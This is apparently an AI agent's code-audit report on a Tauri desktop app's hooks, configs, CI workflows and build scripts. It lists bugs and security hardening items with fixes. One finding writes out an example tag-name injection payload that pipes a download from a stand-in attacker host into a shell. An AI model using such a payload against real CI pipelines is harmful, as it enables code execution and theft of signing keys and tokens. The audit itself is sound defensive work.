# Agent findings: app shell, hooks, configs (~60 files)
# Status: COMPLETE — verified result captured 2026-10-03

FILES COVERED: src/{App,main,pet-lab,types,vite-env}.tsx/ts; src/hooks/ (all 29); src/dev/ (all 15); index.html; vite.config.ts, vite.site.config.ts, tsconfig.json, tailwind.config.js, postcss.config.js, package.json; src-tauri/tauri.conf.json, tauri.staging.conf.json, Cargo.toml (+ capabilities cross-checks); .github/workflows/{ci,build}.yml; scripts/ (all 11 .mjs).

## P0

none

## P1

**1. Pop-out chat window duplicates every completion/error/approval notification — App.tsx:306 (with useChatEvents.ts:110-210, appFocus.ts:13-41, state/notifications.ts:61).**
The pop-out branch is an early `return` placed *after* all event-wiring hooks: usePtyEvents (:243), useChatEvents (:244), usePetEvents (:258) etc. all run in the pop-out window's JS context too, so chat:done/chat:error/chat:approval-request (broadcast to every webview) are handled in BOTH windows. `isViewingSession()` starts with `if (!isAppFocused()) return false;` (useChatEvents.ts:59) and appFocus.ts is a per-window module singleton — when the user is focused in the main window, the blurred pop-out evaluates its session as "not being viewed" and fires relayNotify a second time. Every notification lands twice: two bell rows (push has no dedupe), possibly an OS toast from the pop-out context, plus concurrent read-modify-write of the shared relay.notifications.v1 localStorage key (same WebView2 origin) which can clobber rows. Related fallout: useTtsStreamRead/autoReadFinishedTurn live in both windows (possible double read-aloud), and the pop-out renders no TtsPlayerBar/ToastHost to control them. Fix: detect pop-out before wiring (the memo exists at App.tsx:187-195) and suppress notification emission there, or dedupe on a stable event key.

**2. `github.ref_name` interpolated directly into `run:` shell scripts in the release job — .github/workflows/build.yml:170 and :205.**
`tag="${{ github.ref_name }}"` (Guard step) and `--tag "${{ github.ref_name }}"` (Sign + generate latest.json). Both steps run in the `release` job which holds TAURI_SIGNING_PRIVATE_KEY (:188) and RELEASES_TOKEN (:257) — a tag name with shell metacharacters (`v1.0.0"; curl attacker/x | sh; echo "`) executes BEFORE the version guard can reject it (the guard comparison is inside the same interpolated script). Requires pushing a tag (write access), so hardening rather than a remote hole — but the fix is one line and the blast radius (exfiltrating the updater signing key / releases PAT) is the highest in the repo. Fix: pass via `env: REF_NAME: ${{ github.ref_name }}` and use `"$REF_NAME"`.

## P2

**3. "Hidden" sourcemaps still shipped inside the installer — vite.config.ts:14 (`sourcemap: "hidden"`).**
`hidden` only omits the //# sourceMappingURL reference — the .map files are still emitted into dist/assets/, and Tauri embeds everything under frontendDist into the binary. Nothing strips them (copy-pdfjs-wasm → vite build → tauri build). The readable source of a private-repo app ships inside the NSIS installer (fetchable by URL in devtools) and inflates the bundle. Fix: strip dist/assets/*.map in the build script; archive maps elsewhere for crash decoding.

**4. make-latest-json silently publishes a wrong-version binary or notes — scripts/make-latest-json.mjs:159-169 and :125-130.**
(a) If no artifact matching the exact `Relay_<version>_x64-setup.exe` exists, falls back to `spec.fallbackPattern` "newest present" (:168, only a console note) — a stale exe left in bundle/nsis/ gets signed and labeled with the CURRENT version in latest.json: the updater "updates" users to an older build reporting the new version, then re-offers forever. CI protected by a fresh runner; the documented local flow (RELEASE.md) runs against a persistent target/ tree. (b) extractSection (:125-130) falls back to "first non-empty section" when CHANGELOG.md lacks the version heading — previous version's notes ship as this release's. Fix: hard-fail when the exact version is absent or the changelog section is missing (or opt-in flags).

**5. GitHub Actions pinned by mutable tags/branches, not SHA — build.yml (checkout@v4:59, setup-node@v4:62, dtolnay/rust-toolchain@stable:66, actions/cache@v4:71, upload-artifact@v4:145, download-artifact@v4:179, Azure/trusted-signing-action@v0.5.0:230, softprops/action-gh-release@v2:254) and ci.yml (same family).**
The release job carries the updater signing key and a cross-repo write PAT; a compromised action tag (or the mutable @stable branch) can exfiltrate them and poison the update feed. The Azure action's comment says "bump the pin deliberately after review" but the pin is a mutable tag. Fix: full commit SHAs everywhere.

**6. No job timeouts in the release workflow — build.yml:55 and :155.**
A hung build burns the 6-hour GitHub default at full Windows-runner cost, and the signing key sits decrypted on the runner for that window. Fix: timeout-minutes: 60 (build-windows) / 15 (release).

**7. `dict` is an unstable object, churning three effects in the voice loop — useVoiceLoop.tsx:102, 128, 401, 424.**
useVoiceDictationCore returns a fresh object literal per render (voiceDictationCore.ts:685); VoiceLoopController re-renders on every transcript partial (subscribes to transcript). Effects listing `dict` re-run per partial: the level-poll effect (:117-128) tears down its interval and runs `set({ level: 0 })` (:126), flashing the mic wave bars to zero on every partial transcript mid-speech; mode-off (:397-401) and start/stop subscription (:405-424) also re-run per render. Fix: useMemo the returned object (fields are already stable), or depend on stable members.

**8. stage-browser-mcp.mjs and stage-automation.mjs are a 60-line copy-paste — scripts/stage-browser-mcp.mjs:1-67 and stage-automation.mjs:1-61.**
Byte-identical except the binary name; a fix to one (e.g. the risky `else if (existsSync(debugSrc))` fallback that can stage a DEBUG sidecar into a release installer whenever the release exe is missing) won't reach the other. Fix: one parameterized stage-sidecar.mjs; make the debug fallback opt-in for release staging.

**9. Mic access auto-granted in production via `--use-fake-ui-for-media-stream` — tauri.conf.json:26.**
Auto-accepts every getUserMedia request in the main webview with no OS prompt. Removes the last user-visible signal for microphone use: any script that ever executes in the main window (e.g. a sanitizer bypass — DOMPurify is the only gate, and remote cdnjs scripts are allowed by CSP for live previews) could open the mic silently. Fix: handle PermissionRequested via the webview API so grants are gated by the app, or document the accepted risk next to the arg.

Verified sound / intentional (not reported): CSP cdnjs (used only inside sandbox="allow-scripts" opaque-origin preview iframes, tested in src/test/csp.test.ts); postinstall offline-safe; updater pubkey/endpoint separation prod vs staging (correct, distinct); createUpdaterArtifacts:false matches the manual sign flow; devtools off in release; tag↔version guard in build.yml:167-176; capabilities narrowly scoped; no VITE_ secrets; versions aligned (0.6.0); all 29 hooks have correct cleanup including the listen-promise race in useTauriEvent.ts/useGitStatusPolling.ts.
